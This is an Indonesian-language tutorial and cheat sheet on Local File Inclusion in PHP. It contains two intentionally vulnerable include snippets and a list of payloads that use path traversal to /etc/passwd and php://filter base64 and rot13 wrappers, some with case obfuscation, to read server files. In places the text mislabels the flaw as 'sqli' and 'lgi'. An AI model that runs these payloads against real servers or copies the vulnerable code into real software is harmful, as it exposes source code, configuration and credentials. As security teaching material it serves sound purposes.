# **Local File Inclusion**

[Local File Inclusion](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)

## **Deskripsi Singkat**

_Local File Inclusion_ (selanjutnya akan ditulis dengan _lfi_) merupakan kerentanan yang memungkinkan _attacker_ dapat melakukan _includin_ sebuah file dari dalam server itu sendiri atau hanya sekedar membaca local file dari server itu sendiri. Melalui celah ini, biasanya _attacker_ dapat melakukan controlling parameter yang melakukan _including_ atau _reading_ di dalam server. Dampak umum yang ditimbulkan lewat serangan _sqli_ adalah :

   * Membaca source code dari local server.
   * Membaca file configuration server.
   * Melakukan Remote Code Execution (RCE) jika beruntung.
   
   

## **Penyebab terjadinya Local File Inclusion**


Penyebab terjadinya serangan _lgi_ adalah dikarenakan inputan yang dipassing ke sebuah _function_ yang melakukan _includin_ ataupun _reading_ file. Berikut ini contoh script di `PHP` yang memiliki celah _lfi_.


Contoh 1: 

```php
<?php
include $_GET['page'];
```

Contoh 2:

```php
<?php
include $_GET['page'].".php";
```

Dua contoh di atas di mana _attacker_ dapat melakukan kontrol terhadap nama file yang akan di _include_ oleh script di atas. Setiap inputan yang masuk ke _include_ function yang dapat di kontol oleh _user_ proses inilah yang dinamakan _Local File Inclusion_ .

## **_Cheatsheet_**

Basic 

```txt 
Basic validation read /etc/passwd => ../../../../../../../../../../../../etc/passwd
Read any name file name.php file => name.php
```

Bypassing for example script 2

```txt
Read any name file name.php to => name
```

Using Wrapper to read file

```php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=../../../../../../../../../../../../etc/passwd
pHp://FilTer/convert.base64-encode/resource=index.php
pHp://FilTer/convert.base64-encode/resource=index
```
